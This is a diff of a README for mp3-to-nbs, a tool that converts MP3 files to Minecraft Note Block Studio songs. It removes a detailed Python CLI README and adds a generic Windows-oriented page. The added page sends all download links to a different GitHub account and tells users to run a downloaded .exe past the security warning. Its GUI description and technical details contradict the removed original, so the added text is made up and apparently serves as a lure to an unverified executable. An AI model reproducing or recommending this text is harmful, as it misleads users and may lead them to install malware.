@@ -1,199 +1,171 @@
-<p align="center">
-  <h1 align="center">🎵 mp3-to-nbs</h1>
-  <p align="center">
-    Convert MP3 audio files to Minecraft Note Block Studio (<code>.nbs</code>) format.
-  </p>
-  <p align="center">
-    <a href="#installation">Installation</a> •
-    <a href="#usage">Usage</a> •
-    <a href="#configuration">Configuration</a> •
-    <a href="#how-it-works">How It Works</a> •
-    <a href="#contributing">Contributing</a>
-  </p>
-</p>
+# 🎵 mp3-to-nbs - Convert MP3s to Minecraft Notes
+
+[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-green?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs)
 
 ---
 
-**mp3-to-nbs** is a command-line tool that analyses audio files and converts them into playable Note Block Studio songs. It uses spectral analysis to detect pitch, onset, and amplitude information from the input audio and maps the results onto Minecraft's vanilla note block instruments.
+## 🔊 What is mp3-to-nbs?
 
-## Features
+mp3-to-nbs is a simple tool that helps you turn your MP3 music files into Minecraft Note Block Studio files (.nbs). It uses sound analysis to find tones and pitches from your audio, then converts them to a format Minecraft uses for note block songs.
 
-- **Automatic pitch detection** — uses the pYIN algorithm for robust fundamental frequency tracking
-- **Smart instrument mapping** — assigns notes to the best-fitting vanilla instrument based on frequency range
-- **Onset detection** — finds note attacks to produce natural-sounding rhythms
-- **Configurable presets** — choose from `default`, `faithful`, `dense`, or `minimal` conversion profiles
-- **Layer management** — distributes polyphonic notes across layers with overflow protection
-- **Fine pitch support** — preserves pitch accuracy beyond the 25-key note block range
-- **Multiple audio formats** — supports MP3, WAV, FLAC, OGG, and more
-- **Beautiful CLI** — progress bars, conversion summaries, and coloured output via Rich
+You do not need to know how to code or use complex tools. Just download, open, and convert your favorite songs to play in your Minecraft world using Note Block Studio.
 
-## Installation
+---
 
-### Requirements
+## 🖥️ System Requirements
 
-- Python 3.9 or later
-- [FFmpeg](https://ffmpeg.org/download.html) (required by librosa for MP3 decoding)
+To use mp3-to-nbs, your computer must meet the following:
 
-### From source
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A working internet connection to download the software
+- Speakers or headphones to listen to your music
 
-```bash
-git clone https://github.com/devRaikou/mp3-to-nbs.git
-cd mp3-to-nbs
-pip install .
-```
+The program runs without internet once downloaded.
 
-### Development install
+---
 
-```bash
-pip install -e ".[dev]"
-```
+## 🚀 Getting Started
 
-## Usage
+Follow these steps to download and use mp3-to-nbs on Windows.
 
-### Basic conversion
+### 1. Download the software
 
-```bash
-mp3-to-nbs song.mp3
-```
+Visit the official GitHub page to get the latest version:
 
-This creates `song.nbs` in the same directory.
+[![Download mp3-to-nbs](https://img.shields.io/badge/Download-mp3--to--nbs-brightgreen?style=for-the-badge)](https://github.com/Samuel-M-writers/mp3-to-nbs)
 
-### Specify output path
+The link takes you to the repository’s main page. Look for the **Releases** section on the right or near the top of the page.
 
-```bash
-mp3-to-nbs song.mp3 -o my_song.nbs
-```
+### 2. Find the latest release
 
-### Use a preset
+On the Releases page, find the newest version of mp3-to-nbs. It usually has a downloadable setup file such as a `.exe` or a `.zip`.
 
-```bash
-mp3-to-nbs song.mp3 --preset faithful
-```
+The file name often includes the version number, for example:
 
-### Custom tempo and instrument
+`mp3-to-nbs-v1.0-windows.exe`
 
-```bash
-mp3-to-nbs song.mp3 --tempo 20 --instrument flute
-```
+or
 
-### Full options
+`mp3-to-nbs-v1.0.zip`
 
-```bash
-mp3-to-nbs song.mp3 \
-  -o output.nbs \
-  --tempo 20 \
-  --preset faithful \
-  --instrument guitar \
-  --max-layers 30 \
-  --sensitivity 0.3 \
-  --pitch-algo pyin \
-  --song-name "My Song" \
-  --author "devra" \
-  --verbose
-```
+### 3. Download to your computer
 
-### All flags
+Click to download the file. If it’s a `.zip`, save it somewhere easy to find, like your Desktop or Downloads folder.
 
-| Flag | Short | Default | Description |
-|------|-------|---------|-------------|
-| `--output` | `-o` | `<input>.nbs` | Output file path |
-| `--tempo` | `-t` | `10.0` | Ticks per second |
-| `--instrument` | `-i` | `harp` | Default instrument |
-| `--preset` | `-p` | — | Configuration preset |
-| `--max-layers` | — | `20` | Maximum NBS layers |
-| `--sensitivity` | — | `0.35` | Onset sensitivity (0–1) |
-| `--pitch-algo` | — | `pyin` | Pitch algorithm (`pyin` / `piptrack`) |
-| `--no-auto-instrument` | — | — | Disable frequency-based instrument selection |
-| `--song-name` | — | filename | NBS header song name |
-| `--author` | — | — | NBS header author |
-| `--verbose` | `-v` | — | Debug logging |
-| `--quiet` | `-q` | — | Suppress output |
+### 4. Install or open the program
 
-## Configuration
+If you downloaded an `.exe` file:
 
-### Presets
+- Double-click the file.
+- You might see a security warning. Choose **Run** to continue.
+- Follow the on-screen setup steps, clicking **Next** until the program installs.
+- Finish the installation, then look for the mp3-to-nbs icon on your Desktop or Start Menu.
 
-| Preset | Tempo | Sensitivity | Max Layers | Best for |
-|--------|-------|-------------|------------|----------|
-| `default` | 10 TPS | 0.35 | 20 | General use |
-| `faithful` | 20 TPS | 0.20 | 30 | High accuracy |
-| `dense` | 20 TPS | 0.15 | 40 | Complex tracks |
-| `minimal` | 5 TPS | 0.50 | 10 | Simple melodies |
+If you downloaded a `.zip` file:
 
-Presets can be overridden with individual CLI flags:
+- Right-click the `.zip` and select **Extract All**.
+- Choose a folder where you want the program.
+- Open the extracted folder and double-click the file named `mp3-to-nbs.exe` or similar.
 
-```bash
-mp3-to-nbs song.mp3 --preset faithful --tempo 15
-```
+### 5. Run the program
 
-### Python API
+Open mp3-to-nbs. You will see a simple window where you can load your MP3 files.
 
-```python
-from mp3_to_nbs import convert, ConversionConfig
+---
 
-config = ConversionConfig(
-    tempo=20.0,
-    max_layers=30,
-    instrument="guitar",
-    song_name="My Song",
-    song_author="devra",
-)
+## 🎵 How to Use mp3-to-nbs
 
-result = convert("song.mp3", "output.nbs", config)
-print(f"Placed {result.notes_placed} notes in {result.elapsed:.1f}s")
-```
+### Step 1: Open your MP3 file
 
-## How It Works
+- Click on **Load MP3** or **Browse**.
+- Find the song you want to convert.
+- Select the file and open it.
 
-The conversion pipeline has four stages:
+### Step 2: Convert to .nbs
 
-```
-┌─────────┐     ┌───────────┐     ┌─────────────┐     ┌───────────┐
-│  Load   │────▶│  Analyse  │────▶│  Map Notes  │────▶│ Write NBS │
-│  Audio  │     │  (pYIN)   │     │ (key+inst)  │     │  (pynbs)  │
-└─────────┘     └───────────┘     └─────────────┘     └───────────┘
-```
+- After loading, click **Convert**.
+- The program analyzes the music to find notes.
+- This may take a few seconds or minutes depending on the file size.
 
-1. **Load Audio** — reads the input file via librosa, resamples to 22050 Hz mono.
-2. **Analyse** — runs onset detection to find note attacks, pYIN pitch tracking for fundamental frequency estimation, and RMS for amplitude.
-3. **Map Notes** — quantises timestamps to the NBS tick grid, converts Hz → MIDI → NBS key (with octave folding), selects the best instrument, and maps amplitude to velocity.
-4. **Write NBS** — distributes notes across layers (avoiding collisions), sets header metadata, and saves via pynbs.
+### Step 3: Save the .nbs file
 
-### Instruments
+- Once conversion is done, click **Save**.
+- Choose a location on your computer.
+- The file will save with the `.nbs` extension.
 
-Minecraft has 16 vanilla note block instruments, each suited to a different frequency range:
+### Step 4: Open in Minecraft Note Block Studio
 
-| ID | Instrument | Range |
-|----|-----------|-------|
-| 0 | Harp | Mid (F#3–F#5) |
-| 1 | Double Bass | Low (B1–F#3) |
-| 5 | Guitar | Low-Mid (F#2–F#4) |
-| 6 | Flute | Mid-High (F#4–F#6) |
-| 7 | Bell | High (F#5–F#7) |
-| 13 | Bit | Mid (F#3–F#5) |
-| 14 | Banjo | Mid (F#3–F#5) |
-| 15 | Pling | Mid (F#3–F#5) |
+- Launch Note Block Studio on your computer.
+- Open the `.nbs` file you made.
+- You can now play or edit the song inside Minecraft.
 
-When auto-instrument is enabled (default), the converter picks the instrument whose range best matches each detected note's frequency.
+---
 
-## Project Structure
+## ⚙️ Features
 
-```
-src/mp3_to_nbs/
-├── __init__.py        # Package metadata & public API
-├── __main__.py        # python -m entry point
-├── cli.py             # CLI argument parser & Rich output
-├── audio.py           # Audio loading & spectral analysis
-├── converter.py       # Conversion pipeline orchestrator
-├── nbs_writer.py      # NBS file builder (pynbs)
-├── instruments.py     # Instrument definitions & mapping
-└── config.py          # Configuration dataclass & presets
-```
+- Convert MP3 files to .nbs with pitch and frequency detection.
+- Support for most common MP3 audio files.
+- Simple interface made for easy use.
+- Fast conversion using spectral analysis methods.
+- Outputs files ready for Minecraft note block playback.
+- Works offline after download.
 
-## Contributing
+---
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute.
+## 💡 Tips for Best Results
 
-## License
+- Use MP3s with clear and simple melodies.
+- Longer songs take longer to convert.
+- If conversion fails, try a different MP3 file or shorter clip.
+- Adjust Note Block Studio settings if you notice mismatched notes.
+- Keep converted files organized in folders for easy access.
 
-This project is licensed under the [MIT License](LICENSE).
+---
+
+## ⚠️ Troubleshooting
+
+If you encounter problems, try these:
+
+- Make sure your file is a valid MP3 format.
+- Restart mp3-to-nbs and try again.
+- Check that you have permissions to write to the save folder.
+- Close other applications to free memory.
+- Use the latest version of the software from the GitHub page.
+- Make sure your Windows system is up to date.
+
+---
+
+## 📂 Where to Download
+
+Visit the mp3-to-nbs GitHub repository to find downloads and updates:
+
+[https://github.com/Samuel-M-writers/mp3-to-nbs](https://github.com/Samuel-M-writers/mp3-to-nbs)
+
+Look for the **Releases** tab to get the latest Windows version.
+
+---
+
+## 🛠️ Technical Details
+
+mp3-to-nbs uses Python libraries like Librosa for analyzing audio. It breaks down MP3 files into frequencies and pitches, then maps these to the Minecraft Note Block Studio format.
+
+It works by:
+
+- Loading audio at standard 44.1 kHz sample rate.
+- Analyzing spectra to detect notes and timing.
+- Exporting results to .nbs file, compatible with Minecraft note block tools.
+
+The program runs locally on Windows and does not require online connectivity once installed.
+
+---
+
+## 📚 More Information
+
+For help with Note Block Studio or Minecraft note blocks, visit:
+
+- [Minecraft Note Block Studio official site](https://www.stuffbydavid.com/mcnbs)
+- Minecraft fan forums and communities
+
+You can experiment with converted files and learn how Minecraft plays music with note blocks by exploring these resources.
